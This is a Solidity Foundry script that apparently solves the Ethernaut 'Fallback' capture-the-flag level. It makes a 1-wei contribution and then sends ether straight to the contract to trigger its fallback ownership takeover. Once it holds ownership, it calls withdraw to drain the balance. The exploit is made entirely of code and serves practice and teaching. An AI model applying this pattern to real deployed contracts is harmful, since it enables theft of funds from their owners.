// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script } from "forge-std/Script.sol";
import { Fallback } from "../src/Fallback.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable()); 

    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address myAddress = vm.envAddress("MY_ADDRESS");

        vm.startBroadcast(pk);

        console.log("Balance: ", myAddress.balance);
        console.log("My address: ", myAddress);

        fallbackInstance.contribute{ value: 1 wei }();
        console.log("Contribution after contribute(): ", fallbackInstance.getContribution());

        (bool success, ) = address(fallbackInstance).call{ value: 1 wei }("");
        console.log("Fallback call success: ", success);
        require(success, "Fallback call failed");

        console.log("New Owner: ", fallbackInstance.owner());

        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
